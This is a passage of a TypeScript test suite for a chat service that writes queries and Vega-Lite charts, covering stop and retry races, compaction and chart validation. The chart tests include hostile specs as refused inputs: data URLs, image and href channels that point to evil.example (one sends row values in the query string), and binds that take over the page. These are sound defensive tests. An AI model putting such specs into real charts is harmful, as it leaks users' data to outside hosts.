      assertWellFormed(s.seen[2]!);
      expect(s.checked.filter(c => c.startsWith('PARTIAL'))).toEqual([]);
      expect(JSON.stringify(s.seen[2]!.messages)).toContain('two');
    }
  }, 60_000);

  it('during a retry backoff: no further request, a note, and the next send works', async () => {
    const s = await setup();
    const overloaded = () => fauxAssistantMessage('', { stopReason: 'error', errorMessage: '503 Service Unavailable: overloaded' });
    s.script(round(call('Q1')), overloaded(), round(call('RETRY_ANSWER')), round(call('Q2')));
    const { chatId } = await s.api.chat.send({ chatId: null, text: 'one', source: '' });
    const sending = s.api.chat.send({ chatId, text: 'two', source: 'Q1' });
    await s.until(() => s.seen.length === 2, 'request 2');
    await sleep(30);
    // It is really in a backoff: the retry has not gone out yet.
    expect(s.seen).toHaveLength(2);
    expect(await s.api.chat.stop({ id: chatId! })).toEqual({ stopped: true });
    expect(await sending).toMatchObject({ ok: false, stopped: true });
    await sleep(1_500);
    expect(s.seen, 'no retry after the stop').toHaveLength(2);
    expect(await s.api.chat.send({ chatId, text: 'three', source: 'Q1' })).toMatchObject({ ok: true, turn: { n: 2, source: 'RETRY_ANSWER' } });
    assertWellFormed(s.seen[2]!);
  }, 30_000);

  it('during a second attempt after a retry', async () => {
    const s = await setup();
    const overloaded = fauxAssistantMessage('', { stopReason: 'error', errorMessage: '503 Service Unavailable: overloaded' });
    s.script(overloaded, honours, round(call('Q2')));
    const sending = s.api.chat.send({ chatId: null, text: 'one', source: '' });
    await s.until(() => s.seen.length === 2, 'the retry');
    const chatId = await s.chatIdOf();
    expect(await s.api.chat.stop({ id: chatId })).toEqual({ stopped: true });
    expect(await sending).toMatchObject({ ok: false, stopped: true });
    expect(await s.api.chat.send({ chatId, text: 'two', source: '' })).toMatchObject({ ok: true, turn: { n: 1 } });
    assertWellFormed(s.seen[2]!);
  }, 30_000);

  describe.each<[string, { step: unknown; hold?: string; second?: boolean }]>([
    ['the model is answering (honours the abort)', { step: honours }],
    ['the provider ignores the abort', { step: ignores }],
    ['a check tool runs, finishing when it finishes', { step: round(call('SLOWCHECK')), hold: 'SLOWCHECK' }],
    ['a check tool never returns', { step: round(call('HANGCHECK')), hold: 'HANGCHECK' }],
    ['the re-check never returns', { step: round(call('HANGRECHECK')), hold: 'HANGRECHECK', second: true }],
  ])('while %s', (_name, stage) => {
    it('a send right after the stop returned is taken, not refused as busy, and is well-formed', async () => {
      const seenChecks = new Map<string, number>();
      const s = await setup({
        abortGraceMs: 80,
        check: async source => {
          const n = (seenChecks.get(source) ?? 0) + 1;
          seenChecks.set(source, n);
          if (source === 'SLOWCHECK') { await sleep(30); return goodCheck(source); }
          if (source === 'HANGCHECK' || (source === 'HANGRECHECK' && n === 2)) return new Promise<CheckResult>(() => undefined);
          return goodCheck(source);
        },
      });
      s.script(round(call('Q1')), stage.step, round(call('Q2')));
      const { chatId } = await s.api.chat.send({ chatId: null, text: 'EARLIER', source: '' });
      const sending = s.api.chat.send({ chatId, text: 'STOPPED_PROMPT', source: 'Q1' });
      await s.until(() => s.seen.length === 2 && (!stage.hold || (seenChecks.get(stage.hold) ?? 0) >= (stage.second ? 2 : 1)), 'the stage');
      const started = performance.now();
      expect(await s.api.chat.stop({ id: chatId! })).toEqual({ stopped: true });
      expect(performance.now() - started).toBeLessThan(1_500);
      // No wait at all: same tick as the stop returning.
      const next = await s.api.chat.send({ chatId, text: 'NEXT', source: 'Q1' });
      expect(next, JSON.stringify(next)).toMatchObject({ ok: true, turn: { n: 2, source: 'Q2' } });
      expect(await sending).toMatchObject({ ok: false, stopped: true, turn: { kind: 'note', text: expect.stringMatching(/^Stopped/) } });
      const last = s.seen.at(-1)!;
      assertWellFormed(last);
      for (const word of ['EARLIER', 'STOPPED_PROMPT', 'NEXT']) expect(dump(last)).toContain(word);
      const turns = await s.turns(chatId!);
      expect(kinds(turns)).toEqual(['user', 'version', 'user', 'note', 'user', 'version']);
      expect(numbers(turns)).toEqual([1, 2]);
    });
  });

  it('fuzz: a stop racing a passing check: stopped true means no version from that send, and a version means no stop took effect', async () => {
    const s = await setup({ abortGraceMs: 200, check: async source => { await sleep(1); return goodCheck(source); } });
    s.faux.setResponses(Array.from({ length: 700 }, (_, i) => (() => round(call(`Q${i}`))) as never));
    const started = performance.now();
    const first = await s.api.chat.send({ chatId: null, text: 'seed', source: '' });
    // A run's length depends on the machine's load: stops are spread over it, so both outcomes really occur.
    let span = performance.now() - started;
    const chatId = first.chatId!;
    let seed = 11;
    const next = (n: number) => { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed % n; };
    const tally = { version: 0, stopped: 0 };
    for (let i = 0; i < 600 && (i < 100 || tally.version < 10 || tally.stopped < 10); i++) {
      const before = (await s.turns(chatId)).length;
      const began = performance.now();
      const sending = s.api.chat.send({ chatId, text: `p${i}`, source: '' });
      const wait = next(Math.ceil(span * 1.2) + 1);
      if (wait) await sleep(wait); else await Promise.resolve();
      const stop = await s.api.chat.stop({ id: chatId });
      const result = await sending;
      const added = (await s.turns(chatId)).slice(before);
      if ('stopped' in result) { tally.stopped++; expect(stop.stopped).toBe(true); expect(kinds(added)).toEqual(['user', 'note']); }
      else if (result.ok) { tally.version++; span = performance.now() - began; expect(stop.stopped, JSON.stringify({ i, wait })).toBe(false); expect(kinds(added)).toEqual(['user', 'version']); }
      else throw new Error(`unexpected ${JSON.stringify(result)}`);
    }
    const turns = await s.turns(chatId);
    expect(numbers(turns)).toEqual(numbers(turns).map((_, i) => i + 1));
    expect(tally.stopped, JSON.stringify(tally)).toBeGreaterThan(0);
    expect(tally.version, JSON.stringify(tally)).toBeGreaterThan(0);
  }, 120_000);

  it('stop in the same tick as a first send, before it has a chat listed', async () => {
    const s = await setup();
    s.script(honours);
    const sending = s.api.chat.send({ chatId: null, text: 'x', source: '' });
    await Promise.resolve();
    expect(await s.api.chat.stop({ id: 'not-its-id' })).toEqual({ stopped: false });
    await s.until(() => s.seen.length === 1, 'request');
    await s.api.chat.stop({ id: await s.chatIdOf() });
    expect(await sending).toMatchObject({ ok: false, stopped: true });
  });

  it('stop during a blocking compaction whose summariser ignores the abort: the chat goes on', async () => {
    const s = await setup({ contextWindow: 24_000, abortGraceMs: 80 });
    let hang = false;
    let hung = false;
    const isChat = (ctx: Request) => JSON.stringify(ctx.messages.filter(m => m.role === 'system')).includes('You write TypedHouse queries');
    const respond = (ctx: Request) => {
      if (!isChat(ctx)) {
        if (hang) { hung = true; return new Promise(() => undefined); }
        return say('SUMMARY');
      }
      return round(call('Q'));
    };
    s.faux.setResponses(Array.from({ length: 100 }, () => respond as never));
    const pad = 'lorem ipsum '.repeat(1_300);
    hang = true;
    let chatId: string | null = null;
    let i = 0;
    while (!hung && i < 14) {
      const sending: Promise<{ chatId: string | null }> = s.api.chat.send({ chatId, text: `t${i++} ${pad}`, source: '' });
      const finished = await Promise.race([sending.then(r => r), s.until(() => hung, 'x').then(() => undefined, () => undefined)]);
      chatId ??= await s.chatIdOf();
      if (finished === undefined) {
        await s.api.chat.stop({ id: chatId });
        await sending;
      }
    }
    expect(hung, 'a summary request went out').toBe(true);
    hang = false;
    const next = await Promise.race([s.api.chat.send({ chatId, text: 'short', source: '' }), sleep(5_000).then(() => 'HUNG' as const)]);
    expect(next).not.toBe('HUNG');
    expect(next, JSON.stringify(next).slice(0, 300)).toMatchObject({ ok: true });
  }, 60_000);
});

describe('charts', () => {
  const sendChart = async (args: Record<string, unknown>, sent = 'Q_SENT', steps: unknown[] = []) => {
    const s = await setup({ maxTurns: 2 });
    s.script(round(chartCall(args)), ...steps, say('gave up'));
    const result = await s.api.chat.send({ chatId: null, text: 'chart it', source: sent });
    return { s, result };
  };
  it.each([
    ['inline values', { ...spec, data: { values: [{ country: 'x', revenue: 1 }] } }],
    ['a data url', { ...spec, data: { url: 'https://evil.example/d.json' } }],
    ['a named dataset', { ...spec, data: { name: 'other' }, datasets: { other: [] } }],
    ['datasets alone', { ...spec, datasets: { table: [{ country: 'x' }] } }],
    ['values in a layer', { layer: [{ ...spec, data: { values: [{ country: 'x' }] } }] }],
    ['a url in a concat', { hconcat: [{ ...spec, data: { url: 'https://evil.example/d.json' } }] }],
    ['a lookup from a url', { ...spec, transform: [{ lookup: 'country', from: { data: { url: 'https://evil.example/d.json' }, key: 'k', fields: ['f'] } }] }],
    ['a sequence generator', { ...spec, data: { sequence: { start: 0, stop: 10 } } }],
    ['a sphere generator', { ...spec, data: { sphere: true } }],
    ['an unknown field', { mark: 'bar', encoding: { x: { field: 'nation', type: 'nominal' } } }],
    ['a field in a layer', { layer: [{ mark: 'bar', encoding: { x: { field: 'nation' } } }] }],
    ['an array', [spec]],
    ['a JSON string', JSON.stringify(spec)],
    ['a JSON string with data', JSON.stringify({ ...spec, data: { url: 'https://evil.example/d.json' } })],
    ['null', null],
    ['a number', 3],
  ])('refused and no version: %s', async (_name, bad) => {
    const { s, result } = await sendChart({ spec: bad });
    expect(result.ok, JSON.stringify(result)).toBe(false);
    expect(numbers(await s.turns(result.chatId!))).toEqual([]);
    expect(s.seen.length).toBeGreaterThanOrEqual(2);
  });

  // The S11 defect: these used to pass the check, and a real browser then sent row data to any host.
  it.each([
    ['a mark image with a url value', { mark: 'image', encoding: { x: { field: 'country' }, url: { value: 'https://evil.example/pixel.png' } } }],
    ['a mark image with a url built from a row', { transform: [{ calculate: "'https://evil.example/?q=' + datum.country", as: 'u' }], mark: 'image', encoding: { x: { field: 'revenue', type: 'quantitative' }, url: { field: 'u' } } }],
    ['an image in a layer', { layer: [{ mark: 'image', encoding: { url: { value: 'https://evil.example/p.png' } } }] }],
    ['an href channel with a url value', { mark: 'bar', encoding: { x: { field: 'country' }, href: { value: 'https://evil.example/' } } }],
  ])('a URL in the spec is refused: %s', async (_name, candidate) => {
    const { result } = await sendChart({ spec: candidate });
    expect(result.ok, JSON.stringify(result).slice(0, 200)).toBe(false);
  });

  // A bind aimed at the page replaced the whole Workspace in real Chromium: editor, table and chart gone, only the input left.
  it.each([['body'], ['#root'], ['.cm-content']])('a param bind may not take over the page: element %s', async element => {
    const { result } = await sendChart({ spec: { params: [{ name: 'a', value: 1, bind: { input: 'range', min: 0, max: 2, element } }], mark: 'bar', encoding: { x: { field: 'country', type: 'nominal' } } } });
    expect(result.ok).toBe(false);
  });
  // vega-embed reads usermeta.embedOptions: `bind: 'body'` in a saved query replaced the whole Workspace in real Chromium.
  // The validator refuses usermeta, so this is the render guard's job.
  it('the render guard also stops a bind target given through usermeta.embedOptions', () => {
    const guarded = withoutPageTargets({ usermeta: { embedOptions: { bind: 'body' } }, mark: 'bar' });
    expect(JSON.stringify(guarded)).not.toContain('embedOptions');
  });
  // A title or axis title a real model writes: CSS has no space in url( so this prose is not an address.
  it.each([['Visits by URL (top 10)'], ['url (path)']])('prose is not an address: %s', async title => {
    const { result } = await sendChart({ spec: { title, ...spec } });
    expect(result, JSON.stringify(result).slice(0, 200)).toMatchObject({ ok: true });
  });

  it('a chart turn leaves the query byte for byte alone, with no changed lines', async () => {
    const sent = '  Q_SENT  \n\n// keep this comment\n';
    const { s, result } = await sendChart({ spec, summary: 'A bar.' }, sent);
    expect(result).toMatchObject({ ok: true, turn: { kind: 'version', n: 1, summary: 'A bar.', source: sent, changes: [], addedLines: [] } });
    expect(s.checked.every(c => c === sent)).toBe(true);
  });

  it('a chart with an identical source passed along is the same as none', async () => {
    const { result } = await sendChart({ spec, source: 'Q_SENT' });
    expect(result).toMatchObject({ ok: true, turn: { source: 'Q_SENT', changes: [], chart: expect.any(Object) } });
  });

  it('with no prior query and an empty editor: refused and fed back; with source it works and every line is new', async () => {
    const empty = await sendChart({ spec }, '');
    expect(empty.result.ok).toBe(false);
    expect(JSON.stringify(empty.s.seen[1]!.messages)).toContain('The editor is empty');
    const whitespace = await sendChart({ spec }, '  \n ');
    expect(whitespace.result.ok).toBe(false);
    const withSource = await sendChart({ spec, source: 'Q_NEW' }, '');
    expect(withSource.result).toMatchObject({ ok: true, turn: { n: 1, source: 'Q_NEW', changes: [{ type: 'add', text: 'Q_NEW' }], chart: expect.any(Object) } });
  });

  it('an editor that does not pass is reported, not charted', async () => {
    const { s, result } = await sendChart({ spec }, 'BAD_EDITOR');
    expect(result.ok).toBe(false);
    expect(JSON.stringify(s.seen[1]!.messages)).toContain('refused BAD_EDITOR');
  });

  it('after a text turn, after a failed turn and after a stopped one', async () => {
    const s = await setup({ maxTurns: 1 });
    s.script(round(call('Q1')), say('some words'), round(chartCall({ spec, summary: 'one' })), round(call('BAD')), round(chartCall({ spec, summary: 'two' })), honours, round(chartCall({ spec, summary: 'three' })));
    const { chatId } = await s.api.chat.send({ chatId: null, text: 'a', source: '' });
    await s.api.chat.send({ chatId, text: 'b', source: 'Q1' });
    expect(await s.api.chat.send({ chatId, text: 'c', source: 'Q1' })).toMatchObject({ ok: true, turn: { n: 2, summary: 'one', source: 'Q1' } });
    expect(await s.api.chat.send({ chatId, text: 'd', source: 'Q1' })).toMatchObject({ ok: false });
    expect(await s.api.chat.send({ chatId, text: 'e', source: 'Q1' })).toMatchObject({ ok: true, turn: { n: 3, summary: 'two' } });
    const stopped = s.api.chat.send({ chatId, text: 'f', source: 'Q1' });
    await s.until(() => s.seen.length === 6, 'request');
    await s.api.chat.stop({ id: chatId! });
    await stopped;
    expect(await s.api.chat.send({ chatId, text: 'g', source: 'Q1' })).toMatchObject({ ok: true, turn: { n: 4, summary: 'three' } });
    for (const request of s.seen) assertWellFormed(request);
  });

  it('the source a chart is checked against is this turn\'s, also on a stuck fork, an edit branch and after a reopen', async () => {
    const dir = tempDir();
    const s = await setup({ dir, abortGraceMs: 60 });
    const otherSpec = { mark: 'bar', encoding: { x: { field: 'other', type: 'nominal' } } };
    s.script(round(call('Q1')), ignores, round(chartCall({ spec: otherSpec })), round(chartCall({ spec })));
    const { chatId } = await s.api.chat.send({ chatId: null, text: 'a', source: '' });
    const stuck = s.api.chat.send({ chatId, text: 'b', source: 'Q1' });
    await s.until(() => s.seen.length === 2, 'request');
    await s.api.chat.stop({ id: chatId! });
    await stuck;
    expect(await s.api.chat.send({ chatId, text: 'on fork', source: 'Q_OTHER' })).toMatchObject({ ok: true, turn: { source: 'Q_OTHER', chart: expect.any(Object) } });
    const id = userId(await s.turns(chatId!), 'on fork');
    expect(await s.api.chat.send({ chatId, text: 'on branch', source: 'Q1', replaceFrom: id })).toMatchObject({ ok: true, turn: { source: 'Q1', chart: expect.any(Object) } });
    const before = await s.api.chat.get({ id: chatId! });
    await s.llm.close();
    const next = await setup({ dir });
    expect(await next.api.chat.get({ id: chatId! })).toEqual(before);
    next.script(round(chartCall({ spec: otherSpec })), say('stale refused'));
    // The check must use the sent source, not one remembered from before the reopen.
    expect(await next.api.chat.send({ chatId, text: 'after reopen', source: 'Q1' })).toMatchObject({ ok: false });
    expect(JSON.stringify(next.seen[1]!.messages)).toMatch(/country/);
  });

  it('a chart when the query\'s columns changed since: a stale field is refused and fed back with the real columns', async () => {
    const s = await setup({ maxTurns: 2 });
    s.script(round(call('Q1')), round(chartCall({ spec })), round(chartCall({ spec })), round(chartCall({ spec: { mark: 'bar', encoding: { x: { field: 'other', type: 'nominal' } } } })));
    const { chatId } = await s.api.chat.send({ chatId: null, text: 'a', source: '' });
    await s.api.chat.send({ chatId, text: 'chart', source: 'Q1' });
    const sent = await s.api.chat.send({ chatId, text: 'chart again', source: 'Q_OTHER' });
    expect(sent).toMatchObject({ ok: true, turn: { n: 3, source: 'Q_OTHER', attempts: 2 } });
    expect(JSON.stringify(s.seen[3]!.messages)).toContain('other');
  });

  it('column names the model cannot know yet: a first guess is told the real names', async () => {
    const { s, result } = await sendChart({ spec: { mark: 'bar', encoding: { x: { field: 'guess', type: 'nominal' } } } });
    expect(result.ok).toBe(false);
    const feedback = JSON.stringify(s.seen[1]!.messages.filter(m => m.role === 'toolResult'));
    expect(feedback).toContain('country');
    expect(feedback).toContain('revenue');
  });

  it('a chart in a query-change call: a fault in the spec is fed back and the changed source does not stay', async () => {
    const s = await setup({ maxTurns: 2 });
    s.script(round(chartCall({ spec, source: 'Q_OTHER' })), say('gave up'));
    const sent = await s.api.chat.send({ chatId: null, text: 'x', source: 'Q1' });
    expect(sent).toMatchObject({ ok: false, turn: { kind: 'error' } });
    expect(numbers(await s.turns(sent.chatId!))).toEqual([]);
  });

  it('a chart reply with a non-string source passes nothing into the editor', async () => {
    for (const source of [123, { a: 1 }, null, ['Q']]) {
      const { s, result } = await sendChart({ spec, source });
      expect(result.ok, JSON.stringify({ source, result })).toBe(false);
      expect(numbers(await s.turns(result.chatId!))).toEqual([]);
    }
  });
});

describe('mixed rounds: one round with both tools', () => {
  it('query then chart without source: the pair is what was checked; the query change is not half-applied', async () => {
    const s = await setup();
    s.script(round(call('Q_CHANGED', 'query summary'), chartCall({ spec, summary: 'chart summary' })));
    const sent = await s.api.chat.send({ chatId: null, text: 'x', source: 'Q_SENT' });
    expect(sent).toMatchObject({ ok: true, turn: { kind: 'version', source: 'Q_SENT', chart: expect.any(Object), changes: [], summary: 'chart summary' } });
    if (process.env['TESTER_MATRIX']) (await import('node:fs')).appendFileSync(process.env['TESTER_MATRIX'], `query+chart no source: ${JSON.stringify(sent).slice(0, 200)}\n`);
  });
  it('query then chart whose fields only the new query has: refused on the sent columns, so never a chart over the wrong query', async () => {
    const s = await setup({ maxTurns: 2 });
    s.script(round(call('Q_OTHER'), chartCall({ spec: { mark: 'bar', encoding: { x: { field: 'other', type: 'nominal' } } } })), say('gave up'));
    const sent = await s.api.chat.send({ chatId: null, text: 'x', source: 'Q_SENT' });
    expect(sent.ok).toBe(false);
    expect(numbers(await s.turns(sent.chatId!))).toEqual([]);
  });
  it('chart then query: the query wins and no chart travels with it, so no spec is bound to columns it was not checked against', async () => {
    const s = await setup();
    s.script(round(chartCall({ spec }), call('Q_OTHER', 'query summary')));
    const sent = await s.api.chat.send({ chatId: null, text: 'x', source: 'Q_SENT' });
    expect(sent).toMatchObject({ ok: true, turn: { kind: 'version', source: 'Q_OTHER', summary: 'query summary' } });
    expect(sent.ok && 'chart' in sent.turn).toBe(false);
  });
  it('chart with source then query: the last wins, whole', async () => {
    const s = await setup();
    s.script(round(chartCall({ spec, source: 'Q_ONE' }), call('Q_TWO')));
    const sent = await s.api.chat.send({ chatId: null, text: 'x', source: 'Q_SENT' });
    expect(sent).toMatchObject({ ok: true, turn: { source: 'Q_TWO' } });
    expect(sent.ok && 'chart' in sent.turn).toBe(false);
  });
  it('query then chart with its own source: that source is the version', async () => {
    const s = await setup();
    s.script(round(call('Q_ONE'), chartCall({ spec, source: 'Q_TWO' })));
    expect(await s.api.chat.send({ chatId: null, text: 'x', source: 'Q_SENT' })).toMatchObject({ ok: true, turn: { source: 'Q_TWO', chart: expect.any(Object) } });
  });
  it('a passing chart then a failing query in one round continues the run and never keeps the chart unless it passes last', async () => {
    const s = await setup({ maxTurns: 2 });
    s.script(round(chartCall({ spec }), call('BAD')), say('gave up'));
    const sent = await s.api.chat.send({ chatId: null, text: 'x', source: 'Q_SENT' });
    expect(sent).toMatchObject({ ok: false, turn: { kind: 'error', source: 'BAD' } });
    expect(numbers(await s.turns(sent.chatId!))).toEqual([]);
  });
});

describe('oversized last attempts', () => {
  it('a model source over the limit never becomes a version; recorded: the error turn may still carry it as the last attempt', async () => {
    const s = await setup({ maxTurns: 1 });
    const huge = 'x'.repeat(64_001);
    s.script(round(call(huge)));
    const sent = await s.api.chat.send({ chatId: null, text: 'a', source: '' });
    expect(sent.ok).toBe(false);
    const error = (await s.turns(sent.chatId!)).find(t => t.kind === 'error');
    if (process.env['TESTER_MATRIX']) (await import('node:fs')).appendFileSync(process.env['TESTER_MATRIX'], `oversized error.source length: ${error?.kind === 'error' ? error.source?.length : 'none'}\n`);
    expect(numbers(await s.turns(sent.chatId!))).toEqual([]);
    expect(s.checked.includes(huge)).toBe(false);
  });
});

describe('F34: generating is true until the reply is recorded', () => {
  // The service takes its Harness as an argument, so the gap can be opened exactly where a regression would sit: just before the
  // reply commit. Reads go to the real harness. A service clearing `generating` before that commit reports no generation and no reply here.
  async function held() {
    const dir = tempDir();
    const faux = fauxProvider();
    const models = createModels();
    models.setProvider(faux.provider);
    const model = { provider: faux.provider.id, modelId: faux.getModel().id };
    const check = goodCheck;
    const extension = chatExtension({ guide: 'guide', schema: () => '', check });
    const registry = createRegistry();
    registry.install(extension);
    const harness = await Harness.open(await openStorage(dir), { models, registry }, context);
    let commits = 0;
    let holdAt = Infinity;
    let reached = () => {};
    let release = () => {};
    const atGap = new Promise<void>(resolve => { reached = resolve; });
    const gap = new Promise<void>(resolve => { release = resolve; });
    const proxy = new Proxy(harness, {
      get(target, key) {
        const value = Reflect.get(target, key) as unknown;
        if (key === 'commit') {
          return async (...args: unknown[]) => {
            if (++commits === holdAt) { reached(); await gap; }
            return (value as (...a: unknown[]) => unknown).apply(target, args);
          };
        }
        return typeof value === 'function' ? (value as (...a: unknown[]) => unknown).bind(target) : value;
      },
    });
    const chats = createChats(proxy as Harness, { extension, model: () => model, maxTurns: 6, timeoutMs: 5_000, abortGraceMs: 200, check, exclusive: (_busy, _fail, work) => work() });
    return { chats, faux, harness, hold: (at: number) => { holdAt = at; }, atGap, release };
  }
  it.each([
    ['a version', () => round(call('Q1')), 'version'],
    ['a text reply', () => say('words'), 'text'],
    ['an error', () => round(call('BAD')), 'error'],
  ])('with the reply commit held back, a read still says generating and has no reply (%s)', async (_name, answer, kind) => {
    const h = await held();
    h.faux.setResponses(kind === 'error' ? Array.from({ length: 6 }, () => answer()) : [answer()]);
    h.hold(2);
    const sending = h.chats.send({ chatId: null, text: 'x', source: '' });
    await h.atGap;
    const [chat] = await h.chats.list();
    const during = await h.chats.get(chat!.id);
    expect(during!.turns.map(t => t.kind)).toEqual(['user']);
    expect(during!.generating, 'no reply is recorded yet, so it must still be generating').toBe(true);
    h.release();
    await sending;
    const after = await h.chats.get(chat!.id);
    expect(after!.generating).toBe(false);
    expect(after!.turns.at(-1)!.kind).toBe(kind);
    await h.harness.close(context);
  });
});
